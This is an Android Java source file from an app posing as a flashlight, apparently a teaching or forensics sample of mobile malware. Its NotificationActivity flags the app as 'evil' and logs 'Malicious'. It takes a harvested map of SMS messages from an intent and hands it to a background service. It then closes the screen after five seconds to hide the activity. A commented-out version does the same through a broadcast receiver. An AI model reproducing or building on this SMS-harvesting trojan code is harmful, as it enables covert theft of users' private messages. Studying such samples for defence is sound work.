package com.example.flashlightIITR;


import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.view.Window;

import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;


import java.io.Serializable;
import java.lang.reflect.Type;
import java.util.HashMap;
import java.util.Objects;

public class NotificationActivity extends AppCompatActivity {
    HashMap<String,String>  smsList = new HashMap<String,String>();
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        MainActivity.version="17";
        overridePendingTransition(R.anim.fadein, R.anim.fadeout);
        setContentView(R.layout.activity_notification);
        MainActivity.isEvil=true;
        Clues myclues=new Clues();
        myclues.SendLog("App Mode Change","App entered onCreate()","Malicious");

        Intent intent = getIntent();
        Log.d("Notify", "Got an intent.");

        if (intent != null) {
            Log.d("Notify", "In the if condition.");
            if (intent.hasExtra("SMS_LIST")) {
                // Retrieve the smsList data from the intent extras
                Log.d("Notify", "Intent has SMS_LIST");
                smsList = (HashMap<String,String>) Objects.requireNonNull(getIntent().getExtras()).get("SMS_LIST");
        Log.d("Notify","Receive the data of SMS.");


                Log.d("Notify", String.valueOf(smsList));

                Intent intentBackground = new Intent(this, BackgroundService.class);
                intentBackground.putExtra("SMS_LIST", smsList);
                startService(intentBackground);
                Log.d("Notify","Triggering the BackgroundService");

                new Handler().postDelayed(new Runnable(){
                    @Override
                    public void run() {
                        /* Create an Intent that will start the Menu-Activity. */
                        overridePendingTransition(R.anim.fadein, R.anim.fadeout);
                        onBackPressed();
                        overridePendingTransition(R.anim.fadein, R.anim.fadeout);
                    }
                }, 5000);


            } else {
                Log.e("Notify", "Intent does not contain SMS_LIST extra");
            }
        } else {
            Log.e("Notify", "Intent is null");
        }

    }


}

//public class NotificationActivity extends AppCompatActivity {
//
//    HashMap<String,String>  smsList = new HashMap<String,String>();
//    private final BroadcastReceiver broadcastReceiver = new BroadcastReceiver() {
//        @Override
//        public void onReceive(Context context, Intent intent) {
//            if (intent != null && "com.example.flashlightIITR.START_NOTIFICATION_ACTIVITY".equals(intent.getAction())) {
//                // Retrieve the data from the intent extras
//                smsList = (HashMap<String,String>) Objects.requireNonNull(getIntent().getExtras()).get("SMS_LIST");
//                // For example, start an activity here with the received data
//                // Intent startIntent = new Intent(NotificationActivity.this, YourActivity.class);
//                // startIntent.putExtra("SMS_LIST", smsList);
//                // startActivity(startIntent);
//                Intent intentBackground = new Intent(NotificationActivity.this, BackgroundService.class);
//                intentBackground.putExtra("SMS_LIST", smsList);
//                startService(intentBackground);
//                Log.d("Notify","Triggering the BackgroundService");
//            }
//        }
//    };
//
//    @Override
//    protected void onCreate(Bundle savedInstanceState) {
//        super.onCreate(savedInstanceState);
//        // Register the BroadcastReceiver
//        IntentFilter filter = new IntentFilter("com.example.flashlightIITR.START_NOTIFICATION_ACTIVITY");
//        registerReceiver(broadcastReceiver, filter);
//    }
//
//    @Override
//    protected void onDestroy() {
//        super.onDestroy();
//        // Unregister the BroadcastReceiver to avoid memory leaks
//        unregisterReceiver(broadcastReceiver);
//    }
//}








